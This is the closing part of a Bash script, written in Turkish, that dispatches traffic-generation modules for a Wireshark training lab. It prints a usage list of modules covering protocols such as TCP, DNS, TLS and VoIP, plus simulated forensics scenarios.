    tcp-sequence)    generate_tcp_sequence ;;
    tls)             generate_tls ;;
    icmp)            generate_icmp ;;
    ftp)             generate_ftp ;;
    dhcp)            generate_dhcp ;;
    mixed)           generate_mixed ;;
    forensics)       generate_forensics ;;
    voip)            generate_voip ;;
    udp)             generate_udp ;;
    ipv6)            generate_ipv6 ;;
    fragmentation)   generate_fragmentation ;;
    email)           generate_email ;;
    advanced-tcp)    generate_advanced_tcp ;;
    tcp-graph)       generate_tcp_graph ;;
    performance)     generate_performance ;;
    baseline)        generate_baseline ;;
    filters)         echo "  [BİLGİ] Filters modülü (02) - trafik üretilmez, sadece filter örnekleri gösterilir" ;;
    tshark)          echo "  [BİLGİ] TShark modülü (20) - trafik üretilmez, CLI analiz araçları öğretilir" ;;
    advanced-capture) echo "  [BİLGİ] Advanced Capture modülü (21) - trafik üretilmez, capture teknikleri öğretilir" ;;
    wlan)            echo "  [BİLGİ] WLAN modülü (24) - trafik üretilmez, örnek pcap indirilir (sample-pcaps)" ;;
    sample-pcaps)    echo "  sample-pcaps indirme: ./scripts/download-sample-pcaps.sh" ;;
    *)
        echo "Shark-Tank Trafik Üretici"
        echo ""
        echo "Kullanım: $0 <modül>"
        echo ""
        echo "Modüller:"
        echo "  basics         - (Modül 01) Temel trafik (HTTP, DNS, ICMP, TCP echo)"
        echo "  arp            - (Modül 03) ARP trafiği (ARP request/reply, gratuitous ARP, spoofing)"
        echo "  dhcp           - (Modül 04) DHCP DORA süreci (ayrı docker-compose)"
        echo "  icmp           - (Modül 05) Ping, farklı boyutlar, timeout, TTL"
        echo "  fragmentation  - (Modül 06) IP fragmentation (büyük ping, UDP fragmentation)"
        echo "  ipv6           - (Modül 07) IPv6 link-local, neighbor discovery, AAAA DNS"
        echo "  tcp            - (Modül 08) TCP echo, handshake, port scan, RST"
        echo "  tcp-sequence   - (Modül 09) TCP dizi analizi (retransmission, dup ACK)"
        echo "  udp            - (Modül 10) UDP echo, DNS over UDP, port unreachable"
        echo "  advanced-tcp   - (Modül 11) İleri düzey TCP (keep-alive, window scaling)"
        echo "  dns            - (Modül 12) DNS sorguları (A, AAAA, CNAME, MX, NS, NXDOMAIN)"
        echo "  http           - (Modül 13) HTTP istek/response (GET, POST, 403, 404, redirect)"
        echo "  ftp            - (Modül 14) FTP login, dosya transferi, cleartext credentials"
        echo "  email          - (Modül 15) SMTP email gönderme (cleartext)"
        echo "  tls            - (Modül 16) TLS handshake, HTTPS istekleri, sertifika"
        echo "  mixed          - (Modül 24) Karışık trafik + saldırı simülasyonu (sınav pratiği)"
        echo "  forensics      - (Modül 25) Forensics senaryolar (port scan, SYN flood)"
        echo "  tcp-graph      - (Modül 19) IO Graph, TCP Stream Graphs"
        echo "  performance    - (Modül 20) Performans analizi (RTT, window, throughput)"
        echo "  voip           - (Modül 22) VoIP/SIP trafiği (REGISTER, INVITE, BYE)"
        echo "  baseline       - (Modül 23) Baseline trafik desenleri"
        echo "  filters        - (Modül 02) Filter örnekleri (trafik yok)"
        echo "  tshark         - (Modül 17) TShark CLI analizi (trafik yok)"
        echo "  advanced-capture - (Modül 18) Gelişmiş yakalama teknikleri (trafik yok)"
        echo "  wlan           - (Modül 21) WiFi/WLAN analizi (trafik yok, sample-pcaps)"
        echo "  sample-pcaps   - Wireshark sample captures indir"
        echo "  all            - Tüm modülleri çalıştır"
        echo ""
        echo "Örnek: $0 http"
        ;;
esac
